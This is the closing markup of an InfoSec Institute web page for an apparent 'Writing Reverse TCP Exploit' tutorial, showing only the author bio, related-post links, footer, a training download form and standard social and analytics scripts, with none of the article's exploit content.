        <img alt="" class="avatar avatar-96 photo" height="96" src="http://2.gravatar.com/avatar/867b78589ec6e514fd3290057810b673?s=96&amp;d=mm&amp;r=g" srcset="http://2.gravatar.com/avatar/867b78589ec6e514fd3290057810b673?s=192&amp;d=mm&amp;r=g 2x" width="96"/>
       </div>
       <div class="name">
        <span>
         Author
        </span>
        <h5>
         <a href="http://resources.infosecinstitute.com/author/nikhil-kumar">
          Nikhil Kumar
         </a>
        </h5>
       </div>
       <div class="description">
        Nikhil Kumar, a Certified Ethical Hacker, works as a Information Security Consultant. He has experience in web application pen-testing, social engineering, password cracking and android pen-testing. He is also involved with various organizations to help them in strengthening the security of their applications and infrastructure.
       </div>
      </section>
      <ul class="random-posts ">
       <li style="background-image: url('http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/uploads//podcasts-237x237-c-default.jpg');">
        <a class="icon post-l" href="http://resources.infosecinstitute.com/35-awesome-infosec-influencers-you-need-to-follow/" title="35 Awesome InfoSec Influencers You Need to Follow">
         <h3>
          35 Awesome InfoSec Influencers You Need
         </h3>
        </a>
       </li>
       <li style="background-image: url('http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/uploads//API-Logo-237x237-c-default.gif');">
        <a class="icon post-l" href="http://resources.infosecinstitute.com/securing-web-apis-part-ii-creating-an-api-authenticated-with-oauth-2-in-node-js/" title="Creating an API authenticated with OAuth 2 in Node.js">
         <h3>
          Creating an API authenticated with OAuth
         </h3>
        </a>
       </li>
       <li style="background-image: url('http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/uploads//Buffer-Overflow02042014-237x237-c-default.jpg');">
        <a class="icon post-l" href="http://resources.infosecinstitute.com/stack-based-buffer-overflow-in-win-32-platform-part-8/" title="Analyzing and Writing a Local Exploit 2">
         <h3>
          Analyzing and Writing a Local Exploit
         </h3>
        </a>
       </li>
       <li style="background-image: url('http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/uploads//20090406_rootkit-237x237-c-default.jpg');">
        <a class="icon post-l" href="http://resources.infosecinstitute.com/rootkits-user-mode-kernel-mode-part-1/" title="Rootkits: User Mode &amp; Kernel Mode">
         <h3>
          Rootkits: User Mode &amp; Kernel Mode
         </h3>
        </a>
       </li>
      </ul>
      <div class="comments">
       <div id="disqus_thread">
       </div>
      </div>
     </div>
    </div>
   </section>
   <footer class="site-footer">
    <div class="ctas full">
     <div class="col-3-3 wrapper">
      <div class="col-1-3">
       <h6>
        About InfoSec
       </h6>
       <p>
        InfoSec Institute is the best source for high quality
        <a href="http://www.infosecinstitute.com" style="color:#fff;">
         information security training
        </a>
        . We have been training Information Security and IT Professionals since 1998 with a diverse lineup of relevant training courses. In the past 16 years, over 50,000 individuals have trusted InfoSec Institute for their professional development needs!
       </p>
      </div>
      <div class="col-1-3">
       <h6>
        Connect with us
       </h6>
       <p>
        Stay up to date with
        <a href="http://www.infosecinstitute.com" style="color:#fff;">
         InfoSec Institute
        </a>
        and
        <a href="http://www.intenseschool.com" style="color:#fff;">
         Intense School
        </a>
        - at info@infosecinstitute.com
       </p>
       <ul class="footer-social">
        <li>
         <div class="fb-like" data-action="like" data-href="http://resources.infosecinstitute.com" data-layout="button_count" data-share="false" data-show-faces="false" data-width="90">
         </div>
        </li>
        <li>
         <a class="twitter-follow-button" data-lang="en" data-show-count="false" href="https://twitter.com/infosecedu">
          Follow @infosecedu
         </a>
        </li>
       </ul>
      </div>
      <div class="col-1-3">
       <form action="/newsletter/signup" class="mailchimp has-loader" method="post" novalidate="">
        <aside>
         <h6>
          Join our newsletter
         </h6>
         <p>
          Get the latest news, updates &amp; offers straight to your inbox.
         </p>
        </aside>
        <fieldset>
         <input name="EMAIL" placeholder="Enter your email" title="Email address" type="email" value=""/>
         <input class="generic-cta green" type="submit" value="Subscribe"/>
         <input name="b_2593cfe26893087ed36e00fe3_ba06ce498c" tabindex="-1" type="text" value=""/>
        </fieldset>
       </form>
      </div>
     </div>
    </div>
    <div class="navigation full">
     <div class="col-3-3 wrapper">
      <nav class="footer">
       <ul>
       </ul>
      </nav>
      <div class="copyright">
        InfoSec Institute 2015
      </div>
     </div>
    </div>
   </footer>
  </main>
  <div class="modal">
   <div class="modal-inner">
    <a rel="modal:close">
     Close
    </a>
    <div class="modal-content">
    </div>
   </div>
  </div>
  <div id="modal-hidden">
   <div id="download">
    <div class="pardot form">
     <h4 class="pardot-title">
      File download
     </h4>
     <form action="https://go.pardot.com/l/12882/2014-12-11/cqhcw" id="download-form" method="post">
      <input name="url" type="hidden" value="http://resources.infosecinstitute.com/stack-based-buffer-overflow-in-win-32-platform-part-5-writing-reverse-tcp-exploit/"/>
      <ul>
       <li data-required="">
        <label>
         First Name
        </label>
        <input name="first_name"/>
       </li>
       <li data-required="">
        <label>
         Last Name
        </label>
        <input name="last_name"/>
       </li>
       <li data-required="">
        <label>
         Work Phone Number
        </label>
        <input name="phone"/>
       </li>
       <li data-required="">
        <label>
         Work Email Address
        </label>
        <input name="email"/>
       </li>
       <li>
        <label>
         Job Title
        </label>
        <input name="job_title"/>
       </li>
       <li>
        <label>
         Does your employer pay for training?
        </label>
        <div class="dd">
         <select name="employer_paid_training">
          <option value="No">
           No
          </option>
          <option value="Yes">
           Yes
          </option>
         </select>
        </div>
       </li>
       <li class="training-timeline">
        <label>
         What is your timeline for training?
        </label>
        <div class="dd">
         <select name="training_timeline">
          <option value="N/A">
          </option>
          <option value="Within a month">
           Within a month
          </option>
          <option value="1-3 months">
           1-3 months
          </option>
          <option value="3-6 months">
           3-6 months
          </option>
          <option value="6-12 months">
           6-12 months
          </option>
          <option value="Over 1 year">
           Over 1 year
          </option>
         </select>
        </div>
       </li>
       <li class="full">
        <input name="entry_id" type="hidden" value="31591"/>
        <input name="entry_title" type="hidden" value="Writing Reverse TCP Exploit"/>
        <input name="entry_url" type="hidden" value="http://resources.infosecinstitute.com/stack-based-buffer-overflow-in-win-32-platform-part-5-writing-reverse-tcp-exploit/"/>
        <input class="generic-cta green" type="submit" value="Download files"/>
       </li>
      </ul>
      <p>
       InfoSec institute respects your privacy and will never use your personal information for anything other than to notify you of your requested course pricing. We will never sell your information to third parties. You will not be spammed.
      </p>
      <div style="position:absolute; left:-9999px; top: -9999px;">
       <label for="pardot_extra_field">
        Comments
       </label>
       <input id="pardot_extra_field" name="pardot_extra_field" type="text"/>
      </div>
     </form>
    </div>
   </div>
   <div id="skillset-modal">
    <div class="skillset window">
     <h4>
      What is Skillset?
     </h4>
     <aside>
      <div class="left">
       <h3>
        Skillset
       </h3>
       <h5>
        Practice tests &amp; assessments.
       </h5>
      </div>
      <div class="right">
       <p>
        Practice for certification success with the Skillset library of over 100,000 practice test questions. We analyze your responses and can determine when you are ready to sit for the test. Along your journey to exam readiness, we will:
       </p>
       <p>
       </p>
       <p>
        1. Determine which required skills your knowledge is sufficient
        <br/>
        2. Which required skills you need to work on
        <br/>
        3. Recommend specific skills to practice on next
        <br/>
        4. Track your progress towards a certification exam
       </p>
      </div>
     </aside>
    </div>
   </div>
  </div>
  <script src="//platform.linkedin.com/in.js" type="text/javascript">
   lang: en_US
  </script>
  <script>
   window.twttr=(function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],t=window.twttr||{};if(d.getElementById(id))return;js=d.createElement(s);js.id=id;js.src="https://platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);t._e=[];t.ready=function(f){t._e.push(f);};return t;}(document,"script","twitter-wjs"));
  </script>
  <script>
   (function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&amp;version=v2.3&amp;appId=552038044933986";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));
  </script>
  <script async="" defer="" src="https://apis.google.com/js/platform.js">
  </script>
  <script>
   var postID = 31591;
  </script>
  <script type="text/javascript">
   &lt;!--
piCId = '1951';
piAId = '13882';


(function() {
	function async_load(){
		var s = document.createElement('script'); s.type = 'text/javascript';
		s.src = ('https:' == document.location.protocol ? 'https://pi' : 'http://cdn') + '.pardot.com/pd.js';
		var c = document.getElementsByTagName('script')[0]; c.parentNode.insertBefore(s, c);
	}
	if(window.attachEvent) { window.attachEvent('onload', async_load); }
	else { window.addEventListener('load', async_load, false); }
})();
--&gt;
  </script>
  <script src="http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/plugins/akismet/_inc/form.js?ver=3.1.2" type="text/javascript">
  </script>
  <script src="http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/themes/infosec/app.js" type="text/javascript">
  </script>
  <script type="text/javascript">
   /* &lt;![CDATA[ */
var embedVars = {"disqusConfig":{"platform":"wordpress@4.2.2","language":"","remote_auth_s3":"W10= 007ddc6b91f3714cb8aed3e55ae22593da9bcb53 1436887263","api_key":"1TA9XhBKpqfZxr6kJiBvCescmAiajXtudB0o4aJYPZguLsFA5bUOtWPGbsoOAiku","sso":{"name":"InfoSec Institute","button":false,"url":"http:\/\/resources.infosecinstitute.com\/wp-login.php","logout":"http:\/\/resources.infosecinstitute.com\/wp-login.php?action=logout","width":"800","height":"700"}},"disqusIdentifier":"31591 http:\/\/resources.infosecinstitute.com\/?p=31591","disqusShortname":"infosecinstituteresources","disqusTitle":"Writing Reverse TCP Exploit","disqusUrl":"http:\/\/resources.infosecinstitute.com\/stack-based-buffer-overflow-in-win-32-platform-part-5-writing-reverse-tcp-exploit\/","options":{"manualSync":false},"postId":"31591"};
/* ]]&gt; */
  </script>
  <script src="http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/plugins/disqus-comment-system/media/js/disqus.js?ver=4.2.2" type="text/javascript">
  </script>
  <script type="text/javascript">
   /* &lt;![CDATA[ */
var countVars = {"disqusShortname":"infosecinstituteresources"};
/* ]]&gt; */
  </script>
  <script src="http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/plugins/disqus-comment-system/media/js/count.js?ver=4.2.2" type="text/javascript">
  </script>
  <script src="http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-includes/js/jquery/jquery.js?ver=1.11.2" type="text/javascript">
  </script>
  <script src="http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.2.1" type="text/javascript">
  </script>
  <script type="text/javascript">
   /* &lt;![CDATA[ */
var icegram_pre_data = {"ajax_url":"http:\/\/resources.infosecinstitute.com\/wp-admin\/admin-ajax.php","post_obj":{"is_home":false,"page_id":31591,"action":"display_messages","shortcodes":[],"cache_compatibility":"yes"}};
/* ]]&gt; */
  </script>
  <script src="http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/plugins/icegram/assets/js/main.js?ver=1.9.1" type="text/javascript">
  </script>
 </body>
</html>